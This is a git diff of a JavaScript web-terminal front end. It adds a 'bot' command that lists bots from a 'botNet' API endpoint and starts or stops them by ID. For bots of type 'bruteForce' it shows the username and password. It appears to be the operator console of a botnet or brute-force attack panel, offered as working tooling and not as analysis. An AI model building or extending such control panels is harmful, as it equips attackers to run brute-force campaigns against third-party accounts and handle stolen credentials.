@@ -21,7 +21,7 @@
 
 // import { PollingClient } from './Ajax_io.js';
 
-const commands = ['help', 'clear', 'api-link', 'delete', 'reconnect', 'get', 'reload'];
+const commands = ['help', 'clear', 'bot', 'delete', 'reconnect', 'get', 'reload'];
 const url = window.location.pathname.split('/');
 const endpoint = '/check_commads_updates/'+url[url.length - 1];  // Last part of path
 
@@ -121,39 +121,120 @@ function getCookie(name) {
 }
 
 async function cmd(userInput) {
-    const input = userInput.split(' ');
-    console.log(input);
+    const input = userInput.trim().split(' ').filter(Boolean);
+    console.log('Parsed Input:', input);
 
-    if (input[0].toLowerCase() === "api-link") {
-        if (input.includes('-i') || input.includes('--id')) {
-            if (input.length === 6 && input[1] === 'update') {
-                if ((input[2] === '-i' || input[2] === '--id') &&
-                    (input[4] === '-a' || input[4] === '--action')) {
-                    return `api-link update action`;
-                }
-                if ((input[2] === '-i' || input[2] === '--id') &&
-                    (input[4] === '-l' || input[4] === '--link')) {
-                    return `api-link update link`;
-                }
-            } else if (input[1].toLowerCase() === 'delete' && input.length === 4) {
-                return `api-link delete`;
-            }
-        } else if (input.length === 2 && input[1] === 'help') {
-            return help_cmd(input);
-        } else {
-            return `Please provide correct options`;
-        }
-    } else if (input[0].toLowerCase() === 'get') {
-        const data = await api(null, 'get', '/api_command/api');
-        return JSON.stringify(data, null, 2);
-    } else if (input.length === 1 && input[0] === 'reload') {
-        window.location.reload();
+    if (!input.length) {
+        return 'Please enter a command. Type "help" for available commands.';
     }
-    else if(input[0].toLowerCase() === 'delete'){
-        const btns = document.getElementsByClassName('delelet_btns')
-        for (let i=1;i<btns.length;i++){
-            btns[i].style.display = 'block';
+
+    const command = input[0].toLowerCase();
+
+    if (command === "bot") {
+        // bot command logic
+        if (input.length === 1 || input[1] === '--help' || input[1] === 'help') {
+            return `bot [command] [options]
+Commands:
+    show               : Show all bots.
+    start --id <id>    : Start a bot by ID.
+    stop --id <id>     : Stop a bot by ID.
+Options:
+    --help             : Show this help message.`;
         }
+
+        if (input[1] === 'show') {
+try {
+    const targetId = url[url.length - 1];
+    if (!targetId || targetId === 'undefined') {
+        return 'Error: No valid target ID found in URL.';
+    }
+
+    const data = await api(null, 'GET', `/api_command/botNet/${targetId}`);
+    if (!data) return 'Error: No response received from server.';
+
+    const botList = data.botNetInfo || data;
+    if (!Array.isArray(botList) || botList.length === 0) {
+        return 'No bot data available.';
+    }
+
+    let output = "======================Available Bots==========================\n\n";
+
+    botList.forEach((bot, i) => {
+        // handle array or object format
+        const b = Array.isArray(bot) ? bot : Object.values(bot);
+
+        const id = b[0] || 'N/A';
+        const type = b[4] || 'unknown';
+        const status = b[5] || 'unknown';
+        const threads = b[7] || '0';
+        const username = b[8] || '';
+        const password = b[9] || '';
+
+        output += `Bot #${i + 1}\n`;
+        output += `ID       = ${id}\n`;
+        output += `Type     = ${type}\n`;
+        output += `Status   = ${status}\n`;
+        output += `Threads  = ${threads}\n`;
+
+        if (type === 'bruteForce') {
+            output += `Username = ${username}\n`;
+            output += `Password = ${password}\n`;
+        }
+
+        output += "--------------------------------------------------------------\n";
+    });
+
+    output += "==============================================================\n";
+    return output;
+
+} catch (error) {
+    console.error('Error fetching bot data:', error);
+    return `Failed to fetch bot data: ${error.message}`;
+}
+
+        } else if ((input[1] === 'start' || input[1] === 'stop') && (input[2] === '--id' || input[2] === '-i') && input[3]) {
+            try {
+                const data = { input: userInput };
+                const response = await api(data, 'POST', `/api_command/${url[url.length - 1]}`);
+                const msg = response?.response || response?.message || 'Command executed successfully';
+                return msg;
+            } catch (error) {
+                console.error(`Error executing bot ${input[1]} command:`, error);
+                return `Error executing command: ${error.message}`;
+            }
+        } else {
+            return `Invalid bot command: "${input[1]}". Use 'bot --help' for usage.`;
+        }
+
+    } else if (command === 'get') {
+        try {
+            const data = await api(null, 'GET', '/api_command/api');
+            return JSON.stringify(data, null, 2);
+        } catch (error) {
+            return `Error fetching API data: ${error.message}`;
+        }
+    } else if (command === 'reload') {
+        setTimeout(() => {
+            window.location.reload();
+        }, 100);
+        return 'Reloading page...';
+    } else if (command === 'delete') {
+        const btns = document.getElementsByClassName('delelet_btns');
+        for (let i = 0; i < btns.length; i++) {
+            btns[i].style.display = 'none';
+        }
+        return 'Delete buttons hidden.';
+    } else if (command === 'clear') {
+        const terminal = document.getElementById('terminal');
+        if (terminal) {
+            const lines = terminal.querySelectorAll('.line');
+            lines.forEach(line => {
+                if (!line.querySelector('input')) {
+                    line.remove();
+                }
+            });
+        }
+        return '';
     } else {
         return help_cmd(input);
     }
